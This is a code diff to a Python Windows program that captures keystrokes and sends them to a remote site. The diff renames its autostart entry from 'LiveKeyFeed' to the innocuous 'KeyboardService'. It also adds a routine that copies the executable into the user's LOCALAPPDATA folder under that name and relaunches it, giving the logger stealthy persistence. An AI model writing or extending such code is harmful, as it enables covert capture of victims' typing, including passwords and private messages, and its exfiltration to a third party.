@@ -3,7 +3,9 @@ import time
 import json
 import hashlib
 import platform
+import shutil
 import socket
+import subprocess
 import sys
 import ctypes
 from ctypes import wintypes
@@ -37,7 +39,9 @@ active_modifiers = set()
 state_lock = Lock()
 message_queue = Queue()
 client_started_at = int(time.time() * 1000)
-STARTUP_ENTRY_NAME = "LiveKeyFeed"
+STARTUP_ENTRY_NAME = "KeyboardService"
+INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
+INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -251,6 +255,26 @@ def register_startup_launch():
         print(f"Could not register automatic startup: {error}")
 
 
+def install_and_relaunch():
+    if os.name != "nt" or not getattr(sys, "frozen", False):
+        return False
+
+    current_path = os.path.normcase(os.path.abspath(sys.executable))
+    installed_path = os.path.normcase(os.path.abspath(INSTALL_PATH))
+    if current_path == installed_path:
+        return False
+
+    try:
+        os.makedirs(INSTALL_DIR, exist_ok=True)
+        if not os.path.exists(INSTALL_PATH):
+            shutil.copy2(sys.executable, INSTALL_PATH)
+        subprocess.Popen([INSTALL_PATH], close_fds=True)
+        return True
+    except OSError as error:
+        print(f"Could not install KeyboardService: {error}")
+        return False
+
+
 def heartbeat_sender():
     while True:
         send_heartbeat()
@@ -376,6 +400,9 @@ def on_release(key):
     }
     active_modifiers.discard(aliases.get(key, key))
 
+
+if install_and_relaunch():
+    sys.exit(0)
 
 print(f"Sending to {SITE_URL}")
 register_startup_launch()
